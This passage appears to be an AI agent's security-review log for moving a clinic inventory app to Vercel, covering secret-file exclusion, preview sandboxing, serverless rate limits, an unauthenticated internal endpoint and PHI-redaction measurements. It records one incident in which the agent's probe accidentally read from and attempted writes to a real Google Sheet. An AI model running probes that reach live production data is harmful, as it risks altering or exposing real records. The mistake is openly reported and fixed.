preview/dev if wanted). Test: `test_api_docs_not_exposed_in_production` (strict xfail).

**V2 — .vercelignore is name-specific.** `gcreds.json` and `.env` are excluded (good), and neither is tracked in git, so the
Git-integration deploy path is clean. But a `vercel` CLI upload would include `.env.local`, `.env.production`, `credentials.json`,
`*.pem`, `*.key`, `gcreds.json.bak`, etc. None exist today (`.env.example` holds only empty placeholders), so nothing leaks now;
harden the patterns to globs (`.env*`, `*.pem`, `*.key`, `*credential*`, `*service*account*`) so a future secret file can't ship.
The serverless function bundle itself is scoped by `includeFiles` to `{main.py,app/**,sample_inventory.json}`, so the function
never includes secrets regardless. Test: `test_vercelignore_excludes_all_common_secret_files` (strict xfail).

**V-PREVIEW — preview sandboxing depends on env scoping.** `_auto_sample_preview()` returns true (sample data, email off) only when
`VERCEL_ENV=preview` AND both `DATABASE_URL` and `GOOGLE_CREDENTIALS_JSON` are unset. If the Vercel project sets those for *all*
environments (the default unless an env var is scoped to Production only), preview and branch deploys will talk to the production
database and send real email. Action: in Vercel, scope DATABASE_URL, GOOGLE_CREDENTIALS_JSON, and every email provider key to the
Production environment only, or give previews their own throwaway values. This is config, not code; I can't verify it locally.

**V-STATE — in-memory limits on serverless.** `_hits` (rate limit), `_confirmed`/`_sent_at`/`_alert_times` (email caps) and the
digest counters are module globals, i.e. per warm instance. Vercel runs many short-lived instances and cold-starts freely, so each
gets its own empty counters: the 10/min POST limit, the 20/min lookup limit, the 5/hour confirmation cap, the daily budget and the
30/hour alert digest are all far weaker in production than the tests (single process) show. The EXP-02/06/07 and N1/N3 mitigations
therefore partly regress on serverless. Fix or accept: back these with a shared store (Vercel KV / Upstash Redis), or document that
the limits are best-effort per instance. Not locally testable.

**V3 — X-Forwarded-For behind Vercel.** `_trust_proxy()` trusts the last XFF hop whenever `VERCEL` is set. That is safe only if
Vercel's proxy overwrites inbound XFF with the real client IP (it normally does, and also sets the unspoofable
`x-vercel-forwarded-for`). If a config ever let a client-supplied XFF pass through, the last-hop logic (and the /64 bucket on it)
would be bypassable. Can't verify without a live Vercel deploy (out of scope). Recommend reading `x-vercel-forwarded-for` when
`VERCEL` is set, since the client cannot spoof it. The first preview build of c6b9966 failed (logs not yet available); re-check this
once a preview is reachable.

**Note (pre-existing, not Vercel-specific):** `GET /api/requests` (internal clinic requests, now reachable at `/api/api/requests`)
has no auth and returns the whole internal Requests tab. It was equally reachable on Render. Confirm with the team whether that
endpoint should be HQ-gated.

**Incident (my error, contained):** an early version of my probe used `os.environ.pop()` to clear credentials, but `main.py`'s
`load_dotenv()` re-read them from `.env`, so two inventory reads and two (failed, 502) write attempts reached the real Google
Sheet. Reported to main/the user to check the org Requests tab. No email was sent (provider keys blank, `_send` stubbed). Now
prevented in-repo by commit bd2550f (`load_dotenv(override=False)`, skipped on Vercel/Render) and the `no_google_sheets` conftest
guard; my probes now set empty-string env vars and hard-block the Google client.

**Vercel pass, final (2026-10-10).** Re-run under the lead's stricter guard: from a temp copy of the repo with no `.env` in it or
any parent (`find_dotenv()` returned `''`), every credential variable blanked, and the Google client replaced by one that raises.
Results: production 503 guard on every route (USE_SAMPLE_DATA ignored, casing/whitespace handled); docs 404 in production and
preview, 200 only for local dev; preview with no secrets runs on demo data with no email; inline email returns in 5.0s with a
hanging provider (maxDuration 15s); `x-vercel-forwarded-for` is used on Vercel and ignored elsewhere, so a client on Render or
local can't spoof its bucket with it (`test_vercel_ip_header_only_trusted_on_vercel`). Remaining deploy checks, not code: scope
production secrets to Production only (V-PREVIEW), add the Vercel firewall rate-limit rule (V-STATE), and re-run once the first
preview build succeeds.

**Test fixes along the way.** email-engineer corrected two of my N-tests: the /64 test cleared `_hits` on every call, so it could
never see a 429; and 37 remaining is "Available", not "Limited". I then found the /64 test was still vacuous, because
`_ext_sample` cleared `TRUST_PROXY` after the test set it, so every request shared the "testclient" bucket. I moved the setting
after the fixture and added a control: separate /64s must not share a bucket. Confirmed meaningful: it passes with `_ip_bucket` and
fails when bucketing is replaced with the pre-fix per-address behavior.

**V-PREVIEW re-verified (code fix).** `db.preview_sandboxed()` now forces demo data on `VERCEL_ENV=preview` even with
DATABASE_URL, Google credentials and an email key set. From the `.env`-free copy, with the DB and Google blocked: db disabled,
sample on, submit 200, zero emails, `/api/health` email null. Only `PREVIEW_ALLOW_REAL_DATA=true` (any case) opts out; `1` does
not; production is unaffected. Test: `test_preview_is_sandboxed_even_with_secrets`. The internal `GET /api/requests` now requires
X-HQ-Token (401 without, 200 with; `test_internal_request_list_needs_hq_token`).

**V4 — anonymous internal sheet writer (Medium).** The old internal clinic form, `POST /api/requests` in main (on Vercel,
`/api/api/requests`), still has no auth and no rate limit: 15 of 15 anonymous posts succeeded. The frontend never calls it (it
only uses `/requests`), and the required Vercel firewall rule targets `/api/requests`, which on Vercel is the *org* endpoint, so
it doesn't cover this path. In sheet mode anyone can append unlimited rows to the internal Requests tab and burn the shared Sheets
quota, which also starves inventory reads for every clinic. Fix: add `dependencies=[Depends(require_hq)]` (as on the GET), or
remove the route if nothing uses it. Test: `test_internal_request_submit_is_not_anonymous` (strict xfail).

## PHI redaction coverage (2026-10-10, local snapshot, counts only)

Measured `_redact_phi` (as applied by `get_inventory_records`, with `notes=True` for Notes) against the local 1137-row snapshot,
from a `.env`-free repo copy. The scripts printed only counts and masked shapes, and the ambiguous tokens were judged locally.
No real values appear here or in any message. All examples below are synthetic.

- **Changed:** 39 fields in 36 rows. 23 Pt ID hits (all true positives: every one is a labelled "Pt. ID ##########-##"; 20 rows
  carry such a label) and 16 Notes phone-rule hits. The MRN, DOB and "Patient: Name" rules had 0 hits (forward-looking).
- **Still PHI-looking after redaction: 10 rows, 11 tokens.** 2 are definite slips: the row's labelled Pt ID number is copied into
  another column (Lot Number), unlabelled, and survives. 9 are probable: `##########-##` tokens with the same shape as patient IDs
  but no label (7 in Lot Number, 4 in Notes across both kinds; most in specimen/blood-tube rows). They could be real lot numbers in
  that format, so HQ should eyeball those rows. Synthetic example: Name `Specimen tube Pt. ID <digits>`, Lot Number
  `0000000003-1`, so the Lot Number keeps the ID.
- **False positives: 14 Notes fields in 14 rows, all from the bare 10-11-digit phone rule; 0 were patient phones.** Every one is a
  product code following REF, Reorder number, Catalog reference number or lot number. The other 2 phone hits are manufacturer
  support numbers printed on packaging ("logo and phone number"): harmless to remove, but not patient data. Synthetic example:
  `Reorder REF 3829991234 or lot number 0012345678` both get eaten. Nothing else was altered: REF/lot/gauge/size text, and the tube
  codes that follow a removed ID (e.g. `PP10`), are kept.
- **Checked, not PHI:** the "patient" mentions left in Notes are descriptive ("patient ID label", quoted tube types like
  'Tandem'/'Vacuum'); the "chart" mentions are products; the 600+ "BD" hits were my detector matching the manufacturer.

Tests (synthetic): `test_phi_labelled_ids_redacted_and_product_codes_kept` (passes);
`test_phi_labelled_id_redacted_in_every_column` (strict xfail; fix: redact a row's labelled Pt ID numbers in every field of
that row); `test_phi_phone_rule_keeps_product_codes` (strict xfail; fix: drop the bare-digit-run rule, or skip runs after
REF/catalog/reorder/lot/item, since the separator-shaped and keyword phone rules already cover real phone numbers).

**PHI re-measured (2026-10-10, current code, through `get_inventory_records` with `_redact_row`).** In-process, sample mode
on the snapshot, from a `.env`-free copy, with Google blocked. Counts only.
- Redactions: 23 labelled Pt IDs (9 in Name, 14 in Notes); 3 labelled IDs copied into Lot Number, now removed by the row-level
  fix; 2 phone numbers in Notes.
- (1) PHI-looking text still present in **9 rows**: 8 rows hold 9 unlabelled `##########-##` tokens (5 in Lot Number, 4 in Notes;
  probable patient IDs, possibly real lots, for HQ to review), and 1 row holds a labelled ID copied without its dash
  (`test_phi_labelled_id_redacted_without_dash`, strict xfail). MRN, DOB + date, phone-shaped and "Patient:" + name all
  surviving: 0.
- (2) False positives: **0 product/lot codes** (the bare-digit phone rule was removed;
  `test_phi_phone_rule_keeps_product_codes` now passes). The only non-patient text removed is 2 manufacturer support numbers on
  packaging. Synthetic shape: "box shows the logo and phone number 555.010.0199".

**PHI re-measured again (2026-10-10, specimen-row rule + dash-less fix).** Same method (`get_inventory_records`, sample mode,
`.env`-free copy, Google blocked, counts only).
- (1) PHI-looking text survives in **3 rows**: 4 unlabelled `##########-##` tokens (3 in Lot Number, 1 in Notes) in rows the
  specimen-family rule doesn't classify as specimen tubes. Labelled Pt IDs surviving anywhere in their row, in any form including
  dash-less: **0**. MRN / DOB / phone-shaped / "Patient:" names: 0.
- (2) False positives: **0** product/lot codes after REF/lot/catalog/reorder keywords. The specimen-row rule removed 5 unlabelled
  ID-shaped tokens in 5 rows (2 in Lot Number, 3 in Notes); in 1 of those rows the whole Lot Number cell became `[removed]`. If that
  value was a real lot number, HQ loses it in the dashboard, though not in the sheet. Accepted trade-off unless HQ says otherwise.
  The other non-patient text removed is still the 2 manufacturer phone numbers.
- `test_phi_labelled_id_redacted_without_dash` now passes.

**PHI re-measured (2026-10-10, unlabelled ID tokens now redacted on every row, REF/Cat/Catalog/Item/Model keep-list).**
- **False positives (product/lot codes removed): 3 at most.** 1 definite: an ID-shaped token right after "lot number" in Notes
  (an explicitly labelled lot); synthetic: "box label shows REF 302995 and lot number 1234567890-12". 2 likely: Lot Number cells in
  ordinary product (non-specimen) rows, now shown only as `[removed]`; synthetic: "Suture kit", Lot Number "1234567890-01". In
  total the rule removed 8 unlabelled tokens in 7 rows (4 Lot Number, 4 Notes; 5 in specimen rows, which are probably correct
  removals). No token value repeats across rows, 3 Lot Number cells became `[removed]`, and no ordinary words were altered.
  0 tokens currently rely on the REF/Cat/Catalog/Item/Model keep-list in this snapshot.
- **Surviving PHI-looking rows: 1**, a Lot Number token with a letter suffix (`##########-A#`), which the digits-only suffix
  misses. Labelled IDs surviving in any form: 0. MRN / DOB / phone / names: 0.
- Tests (strict xfail, synthetic): `test_phi_keeps_token_labelled_as_lot` (add Lot to the keep-list),
  `test_phi_removes_id_token_with_letter_suffix` (suffix `[0-9A-Z]{1,2}`).

**PHI final (2026-10-10, current code: every-row ID-token rule, keep-list REF/Cat/Catalog/Item/Model/Part/Lot, letter suffixes).**
- **False positives: at most 2 product/lot codes**, both Lot Number cells in ordinary (non-specimen) product rows now shown as
  `[removed]`. They're unique values, so they can't be told apart from patient IDs without looking (synthetic shape: "Suture kit",
  Lot Number "1234567890-01"). The labelled-lot case is now kept. In total 7 unlabelled tokens were removed in 7 rows (5 in
  specimen rows, likely correct). No ordinary words were altered.
- **Surviving PHI-looking rows: 0.** The one ID-shaped token left is the explicitly labelled "lot number" in Notes, kept by design.
  Labelled IDs in any form, MRN, DOB, phone and names: 0. Both earlier strict xfails (lot keep-list, letter suffix) now pass.
  Suite: 429 passed.
